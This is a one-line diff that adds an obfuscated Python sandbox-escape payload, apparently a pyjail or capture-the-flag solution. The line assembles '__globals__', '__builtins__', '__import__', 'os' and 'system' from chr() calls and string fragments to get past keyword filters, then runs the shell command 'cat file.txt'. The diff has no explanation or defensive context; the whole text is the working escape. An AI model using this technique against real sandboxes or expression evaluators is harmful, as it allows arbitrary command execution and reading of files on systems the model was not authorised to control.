@@ -1,1 +1,1 @@
-
+getattr(getattr(getattr((lambda: 0), chr(95)+chr(95)+'glo'+'bals'+chr(95)+chr(95))[chr(95)+chr(95)+'built'+'ins'+chr(95)+chr(95)], chr(95)+chr(95)+'im'+'port'+chr(95)+chr(95))('o'+'s'), 'sys'+'tem')('cat file.txt')
